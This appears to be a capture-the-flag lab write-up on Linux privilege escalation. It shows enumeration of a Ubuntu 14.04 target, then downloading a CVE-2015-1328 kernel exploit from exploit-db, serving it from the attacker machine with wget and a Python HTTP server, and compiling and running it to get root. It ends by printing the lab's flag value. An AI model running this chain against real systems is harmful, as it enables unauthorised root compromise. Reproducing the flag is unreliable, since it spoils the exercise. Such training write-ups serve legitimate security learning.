# Linux Privilege Escalation Lab Notes

# Step 1: Access the Target Machine

**Objective:** Log in as the low-privilege user `karen`

```bash
┌──(kali㉿kali)-[~]
└─$ ssh karen@10.10.136.211

karen@10.10.136.211's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Aug 30 15:15:37 2025 from ip-10-17-20-209.eu-west-1.compute.internal
Could not chdir to home directory /home/karen: No such file or directory
$ 

```

# Step 2: Basic Enumeration

## Check hostname

```bash
$ hostname
wade7363
$ 
```

## Check kernel version

```bash
$ uname -a
cat /proc/version
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
$ 

```

## Check OS version

```bash
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l

$ 

```

## Check users

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
$ 
```

## Check Python version

```bash
$ python3 --version
Python 3.4.0
$ 
```

# Step 3: Identify Kernel Exploit

## **Objective:** Use kernel vulnerability to escalate privileges to root.

**Details:**

- Target kernel: `3.13.0-24-generic`
- Known CVE: `CVE-2015-1328` (Linux kernel privilege escalation).

## Prepare exploit on attacker machine

```bash
┌──(kali㉿kali)-[~/Tryhack/PE-Kernal]
└─$ wget https://www.exploit-db.com/download/37292 -O 37292.c

--2025-08-30 14:50:31--  https://www.exploit-db.com/download/37292
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [application/txt]
Saving to: ‘37292.c’

37292.c                      100%[=============================================>]   5.00K  --.-KB/s    in 0s      

2025-08-30 14:50:31 (156 MB/s) - ‘37292.c’ saved [5119/5119]

                                                                                                                   
┌──(kali㉿kali)-[~/Tryhack/PE-Kernal]
└─$ ls                     
37292.c
                                                                                                                   
┌──(kali㉿kali)-[~/Tryhack/PE-Kernal]
└─$ python3 -m http.server 8000

```

## Download exploit on target machine

```bash
$ cd /tmp
wget http://10.17.20.209:8000/37292.c
$ --2025-08-30 15:34:26--  http://10.17.20.209:8000/37292.c
Connecting to 10.17.20.209:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘37292.c.1’

100%[========================================================================>] 5,119       --.-K/s   in 0.003s  

2025-08-30 15:34:27 (1.45 MB/s) - ‘37292.c.1’ saved [5119/5119]

$ 

```

# Step 4: Compile & Run Kernel Exploit

## **Objective:** Gain root privileges using the downloaded exploit

```bash
$ cd /tmp
gcc 37292.c -o exploit      # Compile C exploit into executable
./exploit                   # Run the exploit
$ $ spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# 

```

# Step 5: Confirm Root Access

```bash
# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
# 
```

# Step 6: Find flag1.txt

```bash
# cd ../
# ls
bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  dev    home  lib         lost+found  mnt    proc  run   srv   tmp  var
# cd home/matt
# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  examples.desktop  flag1.txt
# cat flag1.txt
THM-28392872729920
# 

```